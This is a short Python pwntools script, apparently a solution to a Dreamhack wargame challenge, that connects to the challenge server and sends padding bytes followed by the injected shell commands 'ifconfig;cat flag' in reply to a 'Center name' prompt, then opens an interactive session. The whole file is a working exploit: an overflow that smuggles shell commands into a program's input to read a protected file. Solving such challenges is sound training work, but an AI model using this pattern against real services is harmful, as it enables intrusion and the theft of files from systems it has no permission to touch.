from pwn import *
context.log_level = 'debug'

hosts = 'host1.dreamhack.games'
port = 10793

payload = b'\x90'*0x20
payload += b'ifconfig;cat flag'

p = remote(hosts,port)

p.recvuntil('Center name: ')
p.sendline(payload)

p.interactive()
